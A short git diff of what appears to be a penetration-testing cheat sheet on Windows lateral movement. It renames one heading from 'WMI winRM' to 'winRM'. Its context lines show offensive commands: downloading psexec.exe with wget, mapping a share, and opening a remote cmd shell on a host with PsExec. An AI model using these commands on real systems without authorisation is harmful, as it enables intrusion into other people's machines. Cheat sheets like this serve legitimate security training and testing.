@@ -56,7 +56,7 @@
   - [NTLM Relay](#ntlm-relay)
   - [Inveigh](#inveigh)
   - [PsExec](#psexec)
-  - [WMI winRM](#wmi-winrm)
+  - [winRM](#winrm)
   - [DCOM](#dcom)
   - [RunasCs](#runascs)
 - [Discovery](#discovery)
@@ -685,7 +685,7 @@ wget https://github.com/maaaaz/impacket-examples-windows/raw/master/psexec.exe
 net use \\files04
 .\PsExec64.exe \\PC1 cmd --accepteula
 ```
-## WMI winRM
+## winRM
 ```powershell
 # winrm
 $username = 'jen';
